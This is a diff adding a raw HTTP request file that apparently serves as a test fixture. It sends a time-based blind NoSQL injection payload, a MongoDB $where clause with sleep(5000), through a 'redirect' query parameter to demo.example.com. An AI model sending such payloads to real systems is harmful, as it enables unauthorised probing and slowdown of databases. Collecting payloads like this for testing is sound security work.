@@ -1,0 +1,4 @@
+GET /a?redirect={\u0022$where\u0022:\u0022sleep(5000)%20||%20true\u0022} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
